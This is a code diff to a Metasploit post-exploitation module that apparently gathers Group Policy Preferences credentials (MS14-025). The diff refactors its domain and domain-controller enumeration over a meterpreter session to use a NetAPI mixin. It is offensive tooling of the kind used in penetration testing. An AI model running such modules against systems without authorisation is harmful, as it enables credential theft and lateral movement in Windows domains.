@@ -13,6 +13,7 @@ class Metasploit3 < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::NetAPI
 
   def initialize(info={})
     super( update_info( info,
@@ -41,7 +42,8 @@ class Metasploit3 < Msf::Post
           ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
           ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
           ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
-          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
+          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
+          ['MSB', 'MS14-025']
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -67,16 +69,11 @@ class Metasploit3 < Msf::Post
     domains = []
     basepaths = []
     fullpaths = []
-    cached_domain_controller = nil
 
     print_status "Checking for group policy history objects..."
-    # Windows XP environment variable points to the correct folder.
-    # Windows Vista and upwards points to ProgramData!
-    all_users = expand_path("%ALLUSERSPROFILE%")
+    all_users = get_env("%ALLUSERSPROFILE%")
 
-    if all_users.include? 'ProgramData'
-      all_users.gsub!('ProgramData','Users\\All Users')
-    else
+    unless all_users.include? 'ProgramData'
       all_users = "#{all_users}\\Application Data"
     end
 
@@ -209,7 +206,7 @@ class Metasploit3 < Msf::Post
     xml_path = "#{path}#{xml_path}"
     begin
       return xml_path if exist? xml_path
-    rescue Rex::Post::Meterpreter::RequestError => e
+    rescue Rex::Post::Meterpreter::RequestError
       # No permissions for this specific file.
       return nil
     end
@@ -347,50 +344,23 @@ class Metasploit3 < Msf::Post
   end
 
   def enum_domains
-    domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
-    buffersize = 500
-    result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-    # Estimate new buffer size on percentage recovered.
-    percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
-    if percent_found > 0
-      buffersize = (buffersize/percent_found).to_i
-    else
-      buffersize += 500
-    end
-
-    while result['return'] == 234
-      buffersize = buffersize + 500
-      result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-    end
-
-    count = result['totalentries']
-    print_status("#{count} Domain(s) found.")
-    startmem = result['bufptr']
-
-    base = 0
     domains = []
+    results = net_server_enum(SV_TYPE_DOMAIN_ENUM)
 
-    if count == 0
-      return domains
+    if results
+      results.each do |domain|
+        domains << domain[:name]
+      end
+
+      domains.uniq!
+      print_status("Retrieved Domain(s) #{domains.join(', ')} from network")
     end
 
-    mem = client.railgun.memread(startmem, 8*count)
-
-    count.times do |i|
-        x = {}
-        x[:platform] = mem[(base + 0),4].unpack("V*")[0]
-        nameptr = mem[(base + 4),4].unpack("V*")[0]
-        x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-        domains << x[:domain]
-        base = base + 8
-    end
-
-    domains.uniq!
-    print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
-    return domains
+    domains
   end
 
   def enum_dcs(domain)
+    hostnames = nil
     # Prevent crash if FQDN domain names are searched for or other disallowed characters:
     # http://support.microsoft.com/kb/909264 \/:*?"<>|
     if domain =~ /[:\*?"<>\\\/.]/
@@ -399,34 +369,19 @@ class Metasploit3 < Msf::Post
     end
 
     print_status("Enumerating DCs for #{domain} on the network...")
-    domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
-    buffersize = 500
-    result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
-    while result['return'] == 234
-      buffersize = buffersize + 500
-      result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
-    end
-    if result['totalentries'] == 0
+    results = net_server_enum(SV_TYPE_DOMAIN_CTRL || SV_TYPE_DOMAIN_BAKCTRL, domain)
+
+    if results.blank?
       print_error("No Domain Controllers found for #{domain}")
-      return nil
+    else
+      hostnames = []
+      results.each do |dc|
+        print_good "DC Found: #{dc[:name]}"
+        hostnames << dc[:name]
+      end
     end
 
-    count = result['totalentries']
-    startmem = result['bufptr']
-
-    base = 0
-    mem = client.railgun.memread(startmem, 8*count)
-    hostnames = []
-    count.times{|i|
-      t = {}
-      t[:platform] = mem[(base + 0),4].unpack("V*")[0]
-      nameptr = mem[(base + 4),4].unpack("V*")[0]
-      t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-      base = base + 8
-      print_good "DC Found: #{t[:dc_hostname]}"
-      hostnames << t[:dc_hostname]
-    }
-    return hostnames
+    hostnames
   end
 
   # We use this for the odd test case where a DC is unable to be enumerated from the network
